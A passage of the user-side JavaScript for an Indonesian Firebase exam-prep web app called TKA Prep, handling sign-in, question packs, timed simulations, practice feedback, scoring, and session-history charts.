// ============================================================
//  APP.JS — TKA Prep (User Side)
//  Firebase v10 modular SDK via CDN compat
// ============================================================

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getAuth,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
  updateProfile
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
import {
  getFirestore,
  doc, getDoc, setDoc, updateDoc, addDoc, getDocs,
  collection, query, orderBy, where, onSnapshot,
  serverTimestamp, Timestamp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

// ── Import config ──────────────────────────────────────────
import firebaseConfig from "./firebase-config.js";

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db   = getFirestore(app);

// ── Global state ───────────────────────────────────────────
let currentUser  = null;
let currentMode  = null;   // 'simulasi' | 'latihan' | 'custom'
let selectedPack = null;
let allPacks     = [];
let sessions     = [];

let examQuestions   = [];
let examCurrentIdx  = 0;
let examAnswers     = {};   // { questionId: selectedOption }
let examTimer       = null;
let examTimeLeft    = 0;
let examStartTime   = null;
let examSessionId   = null;
let isReviewMode    = false;

let scoreChart    = null;
let modeChart     = null;
let categoryChart = null;
let messagesUnsub = null;
let activityInterval = null;
let photoRequestUnsub = null;
let camStream     = null;
let currentPhotoRequestId = null;

// ============================================================
//  INIT
// ============================================================
window.switchAuthTab = switchAuthTab;
window.handleLogin   = handleLogin;
window.handleRegister = handleRegister;
window.handleLogout  = handleLogout;
window.navigateTo    = navigateTo;
window.goToMode      = goToMode;
window.filterHistory = filterHistory;
window.updateCustomFilters = updateCustomFilters;
window.startExam     = startExam;
window.startSimulasi = startSimulasi;
window.toggleDarkMode = toggleDarkMode;
window.allowCameraForever = allowCameraForever;
window.declinePhoto   = declinePhoto;
window.closeCameraModal = closeCameraModal;
window.prevQuestion  = prevQuestion;
window.nextQuestion  = nextQuestion;
window.confirmFinishExam = confirmFinishExam;
window.confirmExitExam   = confirmExitExam;
window.closeResult   = closeResult;
window.reviewSession = reviewSession;
window.openMessages  = openMessages;
window.closeMessagesModal = closeMessagesModal;
window.closeBanner   = closeBanner;
window.closeModal    = closeModal;

document.addEventListener("DOMContentLoaded", () => {
  // Restore dark mode preference
  if (localStorage.getItem("tka-theme") === "dark") {
    document.body.classList.add("dark");
    const btn = document.getElementById("dark-toggle");
    if (btn) btn.textContent = "☀️";
  }

  // Set greeting date
  const el = document.getElementById("greeting-date");
  if (el) el.textContent = formatDateFull(new Date());

  onAuthStateChanged(auth, async (user) => {
    if (user) {
      currentUser = user;
      const snap = await getDoc(doc(db, "users", user.uid));
      if (snap.exists()) {
        const data = snap.data();
        if (data.role === "admin") {
          // redirect admin to admin page
          window.location.href = "admin.html";
          return;
        }
        currentUser._displayName = data.displayName || user.displayName || "User";
      }
      await initApp();
    } else {
      currentUser = null;
      showPage("auth");
    }
    hideLoading();
  });
});

async function initApp() {
  showPage("app");
  updateNavUser();
  await loadPacks();
  await loadSessions();
  renderDashboard();
  listenMessages();
  listenPhotoRequests();
  broadcastActivity("online");
  if (activityInterval) clearInterval(activityInterval);
  activityInterval = setInterval(() => broadcastActivity("online"), 30000);
}

// ============================================================
//  AUTH
// ============================================================
function switchAuthTab(tab) {
  document.getElementById("form-login").style.display    = tab === "login"    ? "" : "none";
  document.getElementById("form-register").style.display = tab === "register" ? "" : "none";
  document.getElementById("tab-login").classList.toggle("active",    tab === "login");
  document.getElementById("tab-register").classList.toggle("active", tab === "register");
}

async function handleLogin() {
  const email = document.getElementById("login-email").value.trim();
  const pass  = document.getElementById("login-password").value;
  const errEl = document.getElementById("login-error");
  errEl.textContent = "";
  if (!email || !pass) { errEl.textContent = "Email dan kata sandi wajib diisi."; return; }
  const btn = document.getElementById("btn-login");
  btn.disabled = true; btn.textContent = "Memproses...";
  try {
    await signInWithEmailAndPassword(auth, email, pass);
  } catch (e) {
    errEl.textContent = friendlyAuthError(e.code);
    btn.disabled = false; btn.textContent = "Masuk";
  }
}

async function handleRegister() {
  const name  = document.getElementById("reg-name").value.trim();
  const email = document.getElementById("reg-email").value.trim();
  const pass  = document.getElementById("reg-password").value;
  const errEl = document.getElementById("reg-error");
  errEl.textContent = "";
  if (!name || !email || !pass) { errEl.textContent = "Semua kolom wajib diisi."; return; }
  if (pass.length < 6) { errEl.textContent = "Kata sandi minimal 6 karakter."; return; }
  const btn = document.getElementById("btn-register");
  btn.disabled = true; btn.textContent = "Mendaftar...";
  try {
    const cred = await createUserWithEmailAndPassword(auth, email, pass);
    await updateProfile(cred.user, { displayName: name });
    await setDoc(doc(db, "users", cred.user.uid), {
      displayName: name,
      email,
      role: "user",
      createdAt: serverTimestamp(),
      lastSeen: serverTimestamp()
    });
  } catch (e) {
    errEl.textContent = friendlyAuthError(e.code);
    btn.disabled = false; btn.textContent = "Buat Akun";
  }
}

async function handleLogout() {
  broadcastActivity("offline");
  if (messagesUnsub) messagesUnsub();
  if (photoRequestUnsub) photoRequestUnsub();
  if (activityInterval) clearInterval(activityInterval);
  stopCameraStream();
  stopExamTimer();
  await signOut(auth);
}

function friendlyAuthError(code) {
  const map = {
    "auth/invalid-email":        "Format email tidak valid.",
    "auth/user-not-found":       "Akun tidak ditemukan.",
    "auth/wrong-password":       "Kata sandi salah.",
    "auth/email-already-in-use": "Email sudah digunakan.",
    "auth/weak-password":        "Kata sandi terlalu lemah.",
    "auth/invalid-credential":   "Email atau kata sandi salah.",
    "auth/too-many-requests":    "Terlalu banyak percobaan. Coba lagi nanti.",
  };
  return map[code] || "Terjadi kesalahan. Coba lagi.";
}

// ============================================================
//  NAVIGATION
// ============================================================
function showPage(page) {
  document.getElementById("auth-page").style.display  = page === "auth" ? "" : "none";
  document.getElementById("app-page").classList.toggle("visible", page === "app");
  document.getElementById("exam-view").classList.toggle("active",  page === "exam");
  document.getElementById("app-page").style.display = page === "app" ? "flex" : "none";
  if (page === "exam") {
    document.getElementById("exam-view").style.display = "flex";
    document.getElementById("app-page").style.display  = "none";
  } else {
    document.getElementById("exam-view").style.display = "none";
  }
}

function navigateTo(viewName) {
  document.querySelectorAll(".view").forEach(v => v.classList.remove("active"));
  const el = document.getElementById("view-" + viewName);
  if (el) el.classList.add("active");
  // bottom nav
  document.querySelectorAll(".bottom-nav-btn").forEach(b => b.classList.remove("active"));
  const bn = document.getElementById("bnav-" + viewName);
  if (bn) bn.classList.add("active");

  if (viewName === "history") renderHistory();
  if (viewName === "dashboard") renderDashboard();

  window.scrollTo({ top: 0, behavior: "smooth" });
}

// ============================================================
//  USER & ACTIVITY
// ============================================================
function updateNavUser() {
  const name = currentUser?._displayName || currentUser?.displayName || "User";
  document.getElementById("nav-username").textContent = name.split(" ")[0];
  document.getElementById("nav-avatar").textContent   = name[0]?.toUpperCase() || "U";
  document.getElementById("greeting-name").textContent = name.split(" ")[0];
}

async function broadcastActivity(status, extra = {}) {
  if (!currentUser) return;
  try {
    await updateDoc(doc(db, "users", currentUser.uid), {
      lastSeen: serverTimestamp(),
      status,
      ...extra
    });
  } catch (e) {
    // setDoc fallback
    try {
      await setDoc(doc(db, "users", currentUser.uid), {
        lastSeen: serverTimestamp(),
        status,
        ...extra
      }, { merge: true });
    } catch (_) {}
  }
}

// ============================================================
//  PACKS
// ============================================================
async function loadPacks() {
  try {
    const snap = await getDocs(collection(db, "questionPacks"));
    allPacks = snap.docs.map(d => ({ id: d.id, ...d.data() }));
  } catch (e) {
    console.error("Load packs:", e);
    allPacks = [];
  }
}

// ============================================================
//  SESSIONS
// ============================================================
async function loadSessions() {
  if (!currentUser) return;
  try {
    const q = query(
      collection(db, "sessions"),
      where("userId", "==", currentUser.uid),
      where("status", "==", "completed"),
      orderBy("completedAt", "desc")
    );
    const snap = await getDocs(q);
    sessions = snap.docs.map(d => ({ id: d.id, ...d.data() }));
  } catch (e) {
    // Fallback: query without orderBy (index might not exist yet)
    console.warn("loadSessions with orderBy failed, trying fallback:", e.message);
    try {
      const q2 = query(
        collection(db, "sessions"),
        where("userId", "==", currentUser.uid),
        where("status", "==", "completed")
      );
      const snap2 = await getDocs(q2);
      sessions = snap2.docs
        .map(d => ({ id: d.id, ...d.data() }))
        .sort((a, b) => {
          const ta = a.completedAt?.toDate ? a.completedAt.toDate() : new Date(a.completedAt || 0);
          const tb = b.completedAt?.toDate ? b.completedAt.toDate() : new Date(b.completedAt || 0);
          return tb - ta;
        });
    } catch (e2) {
      console.error("Load sessions fallback:", e2);
      sessions = [];
    }
  }
}

// ============================================================
//  DASHBOARD RENDER
// ============================================================
function renderDashboard() {
  // Stats
  const total = sessions.length;
  const scores = sessions.map(s => s.score || 0).filter(s => s > 0);
  const avg = scores.length ? Math.round(scores.reduce((a,b)=>a+b,0)/scores.length) : null;
  const best = scores.length ? Math.max(...scores) : null;

  document.getElementById("stat-total").textContent = total;
  document.getElementById("stat-avg").textContent   = avg !== null ? avg : "–";
  document.getElementById("stat-best").textContent  = best !== null ? best : "–";

  // Streak (simple: consecutive days)
  const streak = calcStreak(sessions);
  document.getElementById("stat-streak").textContent = streak;

  // Recent history (last 5)
  const container = document.getElementById("dashboard-history-list");
  if (sessions.length === 0) {
    container.innerHTML = `<div class="empty-state">
      <div class="empty-state-icon">&#128197;</div>
      <div class="empty-state-title">Belum ada sesi</div>
      <div class="empty-state-sub">Mulai mode latihan atau simulasi untuk melihat histori</div>
    </div>`;
    return;
  }
  container.innerHTML = sessions.slice(0, 5).map(s => historyItemHTML(s)).join("");
}

function historyItemHTML(s) {
  const date = s.completedAt ? formatDate(s.completedAt.toDate ? s.completedAt.toDate() : new Date(s.completedAt)) : "–";
  const badgeClass = { simulasi:"badge-simulasi", latihan:"badge-latihan", custom:"badge-custom" }[s.mode] || "badge-custom";
  return `<div class="history-item">
    <span class="history-mode-badge ${badgeClass}">${s.mode}</span>
    <div class="history-info">
      <div class="history-title">${escHtml(s.packTitle || "Sesi Custom")}</div>
      <div class="history-meta">${date} &middot; ${s.totalQuestions || 0} soal &middot; ${s.correctCount || 0} benar</div>
    </div>
    <div class="history-score">${s.score || 0}</div>
  </div>`;
}

function calcStreak(sessions) {
  if (!sessions.length) return 0;
  const days = [...new Set(sessions
    .filter(s => s.completedAt)
    .map(s => {
      const d = s.completedAt.toDate ? s.completedAt.toDate() : new Date(s.completedAt);
      return d.toDateString();
    })
  )].sort((a,b) => new Date(b)-new Date(a));
  let streak = 0, cur = new Date();
  for (const day of days) {
    const d = new Date(day);
    const diff = Math.round((cur - d) / 86400000);
    if (diff <= 1) { streak++; cur = d; } else break;
  }
  return streak;
}

// ============================================================
//  HISTORY & CHARTS
// ============================================================
function renderHistory() {
  renderHistoryList(sessions);
  renderCharts(sessions);
}

function filterHistory(mode, btn) {
  document.querySelectorAll(".filter-pill").forEach(p => p.classList.remove("active"));
  btn.classList.add("active");
  const filtered = mode === "all" ? sessions : sessions.filter(s => s.mode === mode);
  renderHistoryList(filtered);
}

function renderHistoryList(list) {
  const container = document.getElementById("full-history-list");
  if (!list.length) {
    container.innerHTML = `<div class="empty-state">
      <div class="empty-state-icon">&#128197;</div>
      <div class="empty-state-title">Tidak ada data</div>
      <div class="empty-state-sub">Belum ada sesi untuk filter ini</div>
    </div>`;
    return;
  }
  container.innerHTML = list.map(s => historyItemHTML(s)).join("");
}

function renderCharts(data) {
  // Score trend
  const last20 = [...data].reverse().slice(-20);
  const labels = last20.map((_, i) => `#${i+1}`);
  const scores = last20.map(s => s.score || 0);
  const avg = scores.length ? scores.reduce((a,b)=>a+b,0)/scores.length : 0;

  const ctx1 = document.getElementById("score-chart").getContext("2d");
  if (scoreChart) scoreChart.destroy();
  scoreChart = new Chart(ctx1, {
    type: "line",
    data: {
      labels,
      datasets: [
        {
          label: "Skor",
          data: scores,
          borderColor: "#f43f6a",
          backgroundColor: "rgba(244,63,106,.08)",
          tension: .4,
          fill: true,
          pointBackgroundColor: "#f43f6a",
          pointRadius: 4
        },
        {
          label: "Rata-rata",
          data: scores.map(() => Math.round(avg)),
          borderColor: "#ffc2d4",
          borderDash: [6,4],
          tension: 0, pointRadius: 0, fill: false
        }
      ]
    },
    options: {
      responsive: true, maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        y: { min: 0, max: 100, grid: { color: "rgba(0,0,0,.05)" },
          ticks: { font: { size: 11 } } },
        x: { grid: { display: false }, ticks: { font: { size: 11 } } }
      }
    }
  });

  // Mode donut
  const modeCount = { simulasi: 0, latihan: 0, custom: 0 };
  data.forEach(s => { if (modeCount[s.mode] !== undefined) modeCount[s.mode]++; });
  const ctx2 = document.getElementById("mode-chart").getContext("2d");
  if (modeChart) modeChart.destroy();
  modeChart = new Chart(ctx2, {
    type: "doughnut",
    data: {
      labels: ["Simulasi", "Latihan", "Custom"],
      datasets: [{ data: Object.values(modeCount),
        backgroundColor: ["#ff9ab9","#34c97e","#6c8ef5"],
        borderWidth: 0, hoverOffset: 4 }]
    },
    options: {
      responsive: true, maintainAspectRatio: false,
      plugins: {
        legend: { position: "bottom", labels: { font: { size: 11 }, padding: 12, usePointStyle: true } }
      }
    }
  });

  // Category bar
  const catScores = {};
  data.forEach(s => {
    if (!s.category) return;
    if (!catScores[s.category]) catScores[s.category] = [];
    catScores[s.category].push(s.score || 0);
  });
  const catLabels = Object.keys(catScores).slice(0, 6);
  const catAvgs   = catLabels.map(c => Math.round(catScores[c].reduce((a,b)=>a+b,0)/catScores[c].length));
  const ctx3 = document.getElementById("category-chart").getContext("2d");
  if (categoryChart) categoryChart.destroy();
  categoryChart = new Chart(ctx3, {
    type: "bar",
    data: {
      labels: catLabels,
      datasets: [{ label: "Rata-rata", data: catAvgs,
        backgroundColor: "rgba(244,63,106,.25)",
        borderColor: "#f43f6a", borderWidth: 2,
        borderRadius: 6 }]
    },
    options: {
      responsive: true, maintainAspectRatio: false, indexAxis: "y",
      plugins: { legend: { display: false } },
      scales: {
        x: { min: 0, max: 100, grid: { color: "rgba(0,0,0,.05)" },
          ticks: { font: { size: 10 } } },
        y: { grid: { display: false }, ticks: { font: { size: 10 } } }
      }
    }
  });
}

// ============================================================
//  DARK MODE
// ============================================================
function toggleDarkMode() {
  const isDark = document.body.classList.toggle("dark");
  localStorage.setItem("tka-theme", isDark ? "dark" : "light");
  const btn = document.getElementById("dark-toggle");
  if (btn) btn.textContent = isDark ? "☀️" : "🌙";
}

// ============================================================
//  MODE SELECTION & PACK PICKER
// ============================================================
function goToMode(mode) {
  currentMode  = mode;
  selectedPack = null;
  examQuestions = [];

  if (mode === "simulasi") {
    renderSimulasiSetup();
    navigateTo("simulasi-setup");
    return;
  }

  const title = { latihan: "Mode Latihan", custom: "Custom Soal" }[mode];
  document.getElementById("pack-picker-title").textContent = title;
  document.getElementById("pack-picker-sub").textContent =
    mode === "custom" ? "Pilih paket soal, lalu filter berdasarkan kategori" :
    "Pilih paket soal yang ingin dikerjakan";

  // Custom filters visibility
  const cfDiv = document.getElementById("custom-filters");
  cfDiv.style.display = mode === "custom" ? "" : "none";

  // Populate subject & category filters
  if (mode === "custom") populateCustomFilterOptions();

  renderPackPicker();
  navigateTo("pack-picker");
}

// ── Simulasi Setup ─────────────────────────────────────────
function renderSimulasiSetup() {
  const container = document.getElementById("simulasi-pack-select");
  if (!allPacks.length) {
    container.innerHTML = `<div class="empty-state" style="padding:20px;">
      <div class="empty-state-sub">Belum ada paket soal. Admin belum menambahkan paket.</div>
    </div>`;
    document.getElementById("btn-start-simulasi").disabled = true;
    return;
  }

  container.innerHTML = allPacks.map(p => {
    const qCount = (p.questions || []).length;
    const dur    = p.duration ? `${p.duration} menit` : "Tanpa batas";
    return `<label class="simulasi-pack-option" id="spo-${p.id}">
      <input type="checkbox" class="simulasi-pack-cb" value="${p.id}"
        onchange="onSimulasiPackChange()" checked />
      <div class="simulasi-pack-info">
        <div class="simulasi-pack-name">${escHtml(p.title)}</div>
        <div class="simulasi-pack-meta">${qCount} soal &middot; ${escHtml(p.subject || "TKA")} &middot; ${dur}</div>
      </div>
    </label>`;
  }).join("");

  // Auto-fill duration from first pack that has duration
  const firstWithDur = allPacks.find(p => p.duration);
  if (firstWithDur) {
    document.getElementById("simulasi-duration").value = firstWithDur.duration;
  }

  onSimulasiPackChange();
}

window.onSimulasiPackChange = function() {
  const checked = [...document.querySelectorAll(".simulasi-pack-cb:checked")];
  const totalQ  = checked.reduce((sum, cb) => {
    const pack = allPacks.find(p => p.id === cb.value);
    return sum + (pack?.questions?.length || 0);
  }, 0);
  const infoEl = document.getElementById("simulasi-info");
  if (infoEl) {
    infoEl.textContent = checked.length
      ? `${checked.length} paket dipilih · ${totalQ} soal tersedia`
      : "Pilih minimal 1 paket soal";
  }
  document.getElementById("btn-start-simulasi").disabled = checked.length === 0;
};

async function startSimulasi() {
  const checkedIds = [...document.querySelectorAll(".simulasi-pack-cb:checked")].map(cb => cb.value);
  if (!checkedIds.length) { showToast("Pilih minimal 1 paket soal.", "error"); return; }

  const duration  = parseInt(document.getElementById("simulasi-duration").value) || 90;
  const countLimit = parseInt(document.getElementById("simulasi-count").value) || 40;

  // Gabungkan semua soal dari paket terpilih
  let allQuestions = [];
  checkedIds.forEach(id => {
    const pack = allPacks.find(p => p.id === id);
    if (pack?.questions) allQuestions = allQuestions.concat(pack.questions);
  });

  if (!allQuestions.length) { showToast("Tidak ada soal di paket yang dipilih.", "error"); return; }

  // Random & limit
  const questions = shuffleArray(allQuestions).slice(0, countLimit);

  // Build a virtual "pack" for session recording
  const packNames = checkedIds.map(id => allPacks.find(p => p.id === id)?.title || "").join(", ");
  selectedPack = {
    id:       checkedIds.join("+"),
    title:    `Simulasi: ${packNames}`,
    subject:  "Simulasi",
    category: "",
    duration
  };

  currentMode    = "simulasi";
  examQuestions  = questions;
  examCurrentIdx = 0;
  examAnswers    = {};
  isReviewMode   = false;
  examStartTime  = Date.now();
  examTimeLeft   = duration * 60;

  document.getElementById("exam-timer").style.display = "";
  startExamTimer();

  // Create session
  try {
    const sesRef = await addDoc(collection(db, "sessions"), {
      userId:       currentUser.uid,
      packId:       selectedPack.id,
      packTitle:    selectedPack.title,
      mode:         "simulasi",
      subject:      "Simulasi",
      category:     "",
      status:       "ongoing",
      startedAt:    serverTimestamp(),
      currentQuestionIndex: 0,
      answers:      {},
      totalQuestions: questions.length
    });
    examSessionId = sesRef.id;
    broadcastActivity("active", {
      currentActivity: `Simulasi: ${packNames}`,
      currentSessionId: examSessionId
    });
  } catch (e) {
    console.error("Session create:", e);
  }

  buildQGrid();
  renderQuestion();
  showPage("exam");
  document.getElementById("exam-title").textContent = "Simulasi Penuh";
}

function populateCustomFilterOptions() {
  const subjectSet  = new Set();
  const categorySet = new Set();
  allPacks.forEach(p => {
    (p.questions || []).forEach(q => {
      if (q.subject) subjectSet.add(q.subject);
      if (q.category) categorySet.add(q.category);
    });
  });
  const subSel = document.getElementById("filter-subject");
  const catSel = document.getElementById("filter-category");
  subSel.innerHTML = `<option value="">Semua</option>` + [...subjectSet].map(s => `<option>${escHtml(s)}</option>`).join("");
  catSel.innerHTML = `<option value="">Semua</option>` + [...categorySet].map(c => `<option>${escHtml(c)}</option>`).join("");
}

function updateCustomFilters() {
  // re-render pack picker to show filtered counts
  renderPackPicker();
}

function renderPackPicker() {
  const grid = document.getElementById("pack-picker-grid");
  if (!allPacks.length) {
    grid.innerHTML = `<div class="empty-state" style="grid-column:1/-1;">
      <div class="empty-state-icon">&#128230;</div>
      <div class="empty-state-title">Belum ada paket soal</div>
      <div class="empty-state-sub">Admin belum menambahkan paket soal.</div>
    </div>`;
    document.getElementById("pack-start-area").style.display = "none";
    return;
  }

  grid.innerHTML = allPacks.map(p => {
    const qCount = (p.questions || []).length;
    const dur    = p.duration ? `${p.duration} menit` : "Tidak dibatasi";
    return `<div class="pack-card" id="pack-${p.id}" onclick="selectPack('${p.id}')">
      <div class="pack-card-subject">${escHtml(p.subject || "TKA")}</div>
      <div class="pack-card-title">${escHtml(p.title)}</div>
      <div class="pack-card-meta">${qCount} soal &middot; ${dur}</div>
    </div>`;
  }).join("");

  document.getElementById("pack-start-area").style.display = "block";
  document.getElementById("btn-start-exam").disabled = true;
}

window.selectPack = function(packId) {
  document.querySelectorAll(".pack-card").forEach(c => c.classList.remove("selected"));
  document.getElementById("pack-" + packId)?.classList.add("selected");
  selectedPack = allPacks.find(p => p.id === packId);
  document.getElementById("btn-start-exam").disabled = false;
};

// ============================================================
//  START EXAM
// ============================================================
async function startExam() {
  if (!selectedPack) return;

  let questions = selectedPack.questions || [];

  // Custom mode filtering
  if (currentMode === "custom") {
    const subFilter  = document.getElementById("filter-subject").value;
    const catFilter  = document.getElementById("filter-category").value;
    const countLimit = parseInt(document.getElementById("filter-count").value) || 20;
    if (subFilter)  questions = questions.filter(q => q.subject  === subFilter);
    if (catFilter)  questions = questions.filter(q => q.category === catFilter);
    questions = shuffleArray(questions).slice(0, countLimit);
  }

  if (!questions.length) { showToast("Tidak ada soal untuk filter ini.", "error"); return; }

  examQuestions  = questions;
  examCurrentIdx = 0;
  examAnswers    = {};
  isReviewMode   = false;
  examStartTime  = Date.now();

  // latihan & custom: no timer
  examTimeLeft = 0;
  document.getElementById("exam-timer").style.display = "none";

  // Create session in Firestore
  try {
    const sesRef = await addDoc(collection(db, "sessions"), {
      userId:       currentUser.uid,
      packId:       selectedPack.id,
      packTitle:    selectedPack.title,
      mode:         currentMode,
      subject:      selectedPack.subject || "",
      category:     selectedPack.category || "",
      status:       "ongoing",
      startedAt:    serverTimestamp(),
      currentQuestionIndex: 0,
      answers:      {},
      totalQuestions: examQuestions.length
    });
    examSessionId = sesRef.id;
    broadcastActivity("active", {
      currentActivity: `Mengerjakan ${currentMode}: ${selectedPack.title}`,
      currentSessionId: examSessionId
    });
  } catch (e) {
    console.error("Session create:", e);
  }

  buildQGrid();
  renderQuestion();
  showPage("exam");
  document.getElementById("exam-title").textContent =
    { simulasi: "Simulasi Penuh", latihan: "Mode Latihan", custom: "Custom Soal" }[currentMode];
}

// ============================================================
//  EXAM LOGIC
// ============================================================
function buildQGrid() {
  const grid = document.getElementById("q-grid");
  grid.innerHTML = examQuestions.map((_, i) =>
    `<button class="q-grid-btn" id="qgb-${i}" onclick="jumpToQuestion(${i})">${i+1}</button>`
  ).join("");
}

function updateQGrid() {
  examQuestions.forEach((q, i) => {
    const btn = document.getElementById("qgb-" + i);
    if (!btn) return;
    btn.className = "q-grid-btn";
    if (i === examCurrentIdx) btn.classList.add("current");
    else if (examAnswers[q.id]) {
      if (isReviewMode) {
        btn.classList.add(examAnswers[q.id] === q.correctAnswer ? "correct" : "wrong");
      } else {
        btn.classList.add("answered");
      }
    }
  });
}

function renderQuestion() {
  const q   = examQuestions[examCurrentIdx];
  const tot = examQuestions.length;

  document.getElementById("question-number").textContent = `Soal ${examCurrentIdx + 1} / ${tot}`;
  document.getElementById("exam-progress-fill").style.width = `${((examCurrentIdx+1)/tot)*100}%`;

  // Content block
  const cbCard = document.getElementById("content-block-card");
  if (q.contentBlock || (q.contentBlocks && q.contentBlocks.length)) {
    const cb = q.contentBlock || q.contentBlocks[0];
    cbCard.style.display = "";
    document.getElementById("content-block-title").textContent = cb.title || "Teks Bacaan";
    document.getElementById("content-block-text").innerHTML = renderMath(escHtml(cb.content || ""));
  } else {
    cbCard.style.display = "none";
  }

  // Question text (render math)
  document.getElementById("question-text").innerHTML = renderMath(escHtml(q.question || ""));

  // Options
  const optList = document.getElementById("options-list");
  optList.innerHTML = (q.options || []).map(opt => {
    let cls = "option-item";
    const answered = examAnswers[q.id];
    if (answered === opt.label) cls += " selected";
    if (isReviewMode) {
      if (opt.label === q.correctAnswer) cls += " correct";
      else if (answered === opt.label && answered !== q.correctAnswer) cls += " wrong";
    }
    return `<div class="${cls}" onclick="selectOption('${q.id}', '${opt.label}', this)">
      <div class="option-label">${escHtml(opt.label)}</div>
      <div class="option-text">${renderMath(escHtml(opt.text || ""))}</div>
    </div>`;
  }).join("");

  // Feedback (latihan mode)
  const fb = document.getElementById("answer-feedback");
  if (currentMode === "latihan" && examAnswers[q.id]) {
    const correct = examAnswers[q.id] === q.correctAnswer;
    fb.className = "answer-feedback show " + (correct ? "correct" : "wrong");
    document.getElementById("feedback-label").textContent = correct ? "Benar!" : "Salah!";
    document.getElementById("feedback-text").textContent = correct
      ? `Jawaban yang benar adalah ${q.correctAnswer}.`
      : `Jawaban yang benar adalah ${q.correctAnswer}. Pelajari kembali materi ini.`;
  } else if (isReviewMode && examAnswers[q.id]) {
    const correct = examAnswers[q.id] === q.correctAnswer;
    fb.className = "answer-feedback show " + (correct ? "correct" : "wrong");
    document.getElementById("feedback-label").textContent = correct ? "Benar!" : "Salah!";
    document.getElementById("feedback-text").textContent = `Jawaban yang benar adalah ${q.correctAnswer}.`;
  } else {
    fb.className = "answer-feedback";
  }

  // Nav buttons
  document.getElementById("btn-prev").style.display = examCurrentIdx === 0 ? "none" : "";
  const isLast = examCurrentIdx === tot - 1;
  document.getElementById("btn-next").style.display   = isLast ? "none" : "";
  document.getElementById("btn-finish").style.display = isLast ? "" : "none";

  updateQGrid();
  renderMathInPage();
}

window.selectOption = function(questionId, label, el) {
  if (isReviewMode) return;

  const q = examQuestions.find(q => q.id === questionId);
  if (!q) return;

  examAnswers[questionId] = label;

  // Update UI
  document.querySelectorAll(".option-item").forEach(o => {
    o.classList.remove("selected", "correct", "wrong");
  });
  el.closest(".option-item")?.classList.add("selected");

  if (currentMode === "latihan") {
    const correct = label === q.correctAnswer;
    document.querySelectorAll(".option-item").forEach(o => {
      const lbl = o.querySelector(".option-label").textContent.trim();
      if (lbl === q.correctAnswer) o.classList.add("correct");
    });
    if (!correct) el.closest(".option-item")?.classList.add("wrong");

    const fb = document.getElementById("answer-feedback");
    fb.className = "answer-feedback show " + (correct ? "correct" : "wrong");
    document.getElementById("feedback-label").textContent = correct ? "Benar!" : "Salah!";
    document.getElementById("feedback-text").textContent = correct
      ? `Jawaban yang benar adalah ${q.correctAnswer}.`
      : `Jawaban yang benar adalah ${q.correctAnswer}. Pelajari kembali materi ini.`;
  }

  updateQGrid();
  // Save progress
  saveExamProgress();
};

function prevQuestion() { if (examCurrentIdx > 0) { examCurrentIdx--; renderQuestion(); } }
function nextQuestion() { if (examCurrentIdx < examQuestions.length - 1) { examCurrentIdx++; renderQuestion(); } }

window.jumpToQuestion = function(i) { examCurrentIdx = i; renderQuestion(); };

async function saveExamProgress() {
  if (!examSessionId) return;
  try {
    await updateDoc(doc(db, "sessions", examSessionId), {
      answers: examAnswers,
      currentQuestionIndex: examCurrentIdx
    });
  } catch (e) {}
}

// ── Timer ──────────────────────────────────────────────────
function startExamTimer() {
  updateTimerDisplay();
  examTimer = setInterval(() => {
    examTimeLeft--;
    updateTimerDisplay();
    if (examTimeLeft <= 0) {
      clearInterval(examTimer);
      finishExam();
    }
  }, 1000);
}

function stopExamTimer() {
  if (examTimer) clearInterval(examTimer);
  examTimer = null;
}

function updateTimerDisplay() {
  const el = document.getElementById("exam-timer");
  if (!el) return;
  const m = Math.floor(examTimeLeft / 60);
  const s = examTimeLeft % 60;
  el.textContent = `${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;
  el.className = "exam-timer";
  if (examTimeLeft <= 300) el.classList.add("warning");
  if (examTimeLeft <= 60)  el.classList.add("danger");
}

// ── Finish / Exit ─────────────────────────────────────────
function confirmFinishExam() {
  const unanswered = examQuestions.filter(q => !examAnswers[q.id]).length;
  showModal(
    "Kumpulkan Jawaban?",
    unanswered > 0
      ? `Masih ada ${unanswered} soal yang belum dijawab. Yakin ingin mengumpulkan?`
      : "Semua soal sudah dijawab. Yakin ingin mengumpulkan?",
    finishExam
  );
}

function confirmExitExam() {
  showModal(
    "Keluar dari Sesi?",
    "Progres kamu tidak akan disimpan sebagai hasil akhir. Yakin keluar?",
    async () => {
      stopExamTimer();
      if (examSessionId) {
        try { await updateDoc(doc(db, "sessions", examSessionId), { status: "abandoned" }); } catch(e){}
      }
      broadcastActivity("online", { currentActivity: null, currentSessionId: null });
      showPage("app");
      navigateTo("dashboard");
    }
  );
}

async function finishExam() {
  stopExamTimer();
  const elapsed = Math.round((Date.now() - examStartTime) / 1000);

  let correct = 0, wrong = 0, unanswered = 0;
  examQuestions.forEach(q => {
    if (!examAnswers[q.id]) unanswered++;
    else if (examAnswers[q.id] === q.correctAnswer) correct++;
    else wrong++;
  });

  const score = Math.round((correct / examQuestions.length) * 100);

  // Save to Firestore
  if (examSessionId) {
    try {
      await updateDoc(doc(db, "sessions", examSessionId), {
        status:       "completed",
        completedAt:  serverTimestamp(),
        answers:      examAnswers,
        score, correctCount: correct, wrongCount: wrong, unansweredCount: unanswered,
        totalQuestions: examQuestions.length,
        elapsedSeconds: elapsed,
        category: selectedPack?.category || "",
        subject:  selectedPack?.subject  || ""
      });
    } catch (e) { console.error("Finish session:", e); }
  }

  broadcastActivity("online", { currentActivity: null, currentSessionId: null });

  // Show result
  const icon = score >= 80 ? "&#127881;" : score >= 60 ? "&#128522;" : "&#128517;";
  document.getElementById("result-icon").innerHTML = icon;
  document.getElementById("result-title").textContent =
    score >= 80 ? "Luar Biasa!" : score >= 60 ? "Cukup Bagus!" : "Tetap Semangat!";
  document.getElementById("result-score").innerHTML = `${score}<span>/100</span>`;
  document.getElementById("res-correct").textContent   = correct;
  document.getElementById("res-wrong").textContent     = wrong;
  document.getElementById("res-unanswered").textContent = unanswered;
  document.getElementById("res-time").textContent = formatElapsed(elapsed);
  document.getElementById("result-overlay").classList.add("show");

  // Reload sessions
  await loadSessions();
}

function reviewSession() {
  document.getElementById("result-overlay").classList.remove("show");
  isReviewMode = true;
  examCurrentIdx = 0;
  renderQuestion();
}

